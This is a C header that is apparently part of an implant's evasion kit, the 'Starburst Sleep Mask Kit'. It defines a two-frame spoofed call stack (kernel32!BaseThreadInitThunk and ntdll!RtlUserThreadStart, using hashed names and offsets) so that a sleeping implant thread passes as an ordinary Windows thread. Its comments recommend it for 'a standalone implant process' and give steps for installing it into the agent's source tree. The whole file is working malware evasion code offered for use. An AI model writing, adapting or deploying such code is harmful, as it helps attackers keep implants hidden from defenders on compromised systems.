/*
 * Starburst Sleep Mask Kit - Standard Thread Profile (2-frame)
 *
 * Mimics the idle call stack of a standard Windows thread that was created
 * via CreateThread / _beginthreadex. This is the most common thread pattern
 * seen across all Windows processes and is the safest default choice.
 *
 * Spoofed stack (as seen by a debugger, top = innermost):
 *
 *   kernel32!BaseThreadInitThunk+0x14
 *   ntdll!RtlUserThreadStart+0x21
 *
 * Where you would see this pattern:
 *   - Any process that creates threads directly (services, applications)
 *   - Default thread entry pattern for most Windows executables
 *   - Safe choice when running as a standalone implant process
 *
 * Usage: Copy this file to agent_code/include/evasion/spoof_profiles.h
 */

#ifndef STARBURST_EVASION_SPOOF_PROFILES_H
#define STARBURST_EVASION_SPOOF_PROFILES_H

#include <constexpr.h>
#include <stdint.h>

#define SPOOF_MAX_FRAMES 10

struct SPOOF_FRAME_DEF {
    uint32_t module_hash;
    uint32_t func_hash;
    uint32_t offset;
};

static inline void populate_spoof_frames(
    SPOOF_FRAME_DEF* frames, uint32_t* count
) {
    uint32_t i = 0;

    /*
     * Frame 0 (innermost): kernel32!BaseThreadInitThunk+0x14
     *
     * This is the standard thread dispatch function. The +0x14 offset
     * corresponds to the return address after the call to the actual
     * thread start routine. Every user-mode thread created via the
     * Win32 API passes through this function.
     */
    frames[i].module_hash = expr::hash_string<wchar_t>( L"kernel32.dll" );
    frames[i].func_hash   = expr::hash_string( "BaseThreadInitThunk" );
    frames[i].offset      = 0x14;
    i++;

    /*
     * Frame 1 (outermost): ntdll!RtlUserThreadStart+0x21
     *
     * The true entry point for all user-mode threads. This is the
     * bottom of every thread's call stack. The +0x21 offset is the
     * return address after the call to BaseThreadInitThunk.
     */
    frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
    frames[i].func_hash   = expr::hash_string( "RtlUserThreadStart" );
    frames[i].offset      = 0x21;
    i++;

    *count = i;
}

#endif /* STARBURST_EVASION_SPOOF_PROFILES_H */
